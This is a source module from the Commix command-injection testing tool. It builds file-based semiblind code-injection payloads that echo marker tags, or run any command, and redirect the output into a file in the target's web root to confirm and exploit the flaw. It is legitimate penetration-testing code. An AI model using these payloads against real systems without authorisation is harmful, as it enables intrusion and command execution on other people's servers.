#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

from src.utils import settings

"""
The "file-based" injection technique on Semiblind Code Injection.
The available "file-based" payloads.

Nothing here spells out a language: the command comes from the grammar of whichever one is being
evaluated. The redirection is the shell's own, so one payload serves either operating system.
"""

# The command, run from inside the string being evaluated.
def _run(cmd):
  return settings.EVAL_GRAMMAR.run(cmd)

# A statement terminator, where the boundary being tested can carry one.
def _end(separator):
  return settings.EVAL_GRAMMAR.TERMINATOR if separator else ""

# Where the output is written, as the shell doing the writing sees it.
def _output_path(OUTPUT_TEXTFILE):
  return settings.WEB_ROOT + OUTPUT_TEXTFILE

"""
The output file's path on a Windows target - the redirection is the shell's own either way.
"""
def windows_output_path(OUTPUT_TEXTFILE):
  return _output_path(OUTPUT_TEXTFILE)

"""
File-based decision payload (check if host is vulnerable).
"""
def decision(separator, TAG, OUTPUT_TEXTFILE):
  return _run("echo " + TAG + settings.FILE_WRITE_OPERATOR + _output_path(OUTPUT_TEXTFILE)) + _end(separator)

"""
Several markers at once, so a target answering the same way to every payload can be told apart.
"""
def decision_combined(separator, tags, OUTPUT_TEXTFILE):
  written = "echo " + "".join(tags) + settings.FILE_WRITE_OPERATOR + _output_path(OUTPUT_TEXTFILE)
  return _run(written) + _end(separator)

"""
__Warning__: The alternative shells are still experimental.
"""
def decision_alter_interpreter(separator, TAG, OUTPUT_TEXTFILE):
  return decision(separator, TAG, OUTPUT_TEXTFILE)

"""
__Warning__: The alternative shells are still experimental.
"""
def decision_combined_alter_interpreter(separator, tags, OUTPUT_TEXTFILE):
  return decision_combined(separator, tags, OUTPUT_TEXTFILE)

"""
Execute shell commands on vulnerable host.
"""
def cmd_execution(separator, cmd, OUTPUT_TEXTFILE):
  settings.USER_APPLIED_CMD = cmd
  return _run(cmd + settings.FILE_WRITE_OPERATOR + _output_path(OUTPUT_TEXTFILE)) + _end(separator)

"""
__Warning__: The alternative shells are still experimental.
"""
def cmd_execution_alter_interpreter(separator, cmd, OUTPUT_TEXTFILE):
  return cmd_execution(separator, cmd, OUTPUT_TEXTFILE)

# eof
